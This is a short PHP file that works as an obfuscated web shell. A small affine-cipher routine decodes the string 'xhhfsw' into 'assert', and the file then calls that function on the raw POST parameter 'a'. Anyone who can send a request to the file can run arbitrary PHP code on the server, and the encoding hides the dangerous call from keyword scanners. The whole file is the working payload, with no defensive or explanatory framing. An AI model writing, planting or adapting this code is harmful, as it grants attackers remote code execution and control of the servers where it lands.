<?php
    function encode($para0){
        $m=strtolower($para0);
        $a = 7;
        $b = 21;
        $c = "";
        for($i=0;$i<strlen($m);$i++)
        {

            $c=$c.chr((((ord(substr($m,$i,1))-97)*$a+$b)%26)+97);

        }
        return $c;
    }
    $a = $_POST['a'];
    call_user_func_array(encode('xhhfsw'), array($a));
?>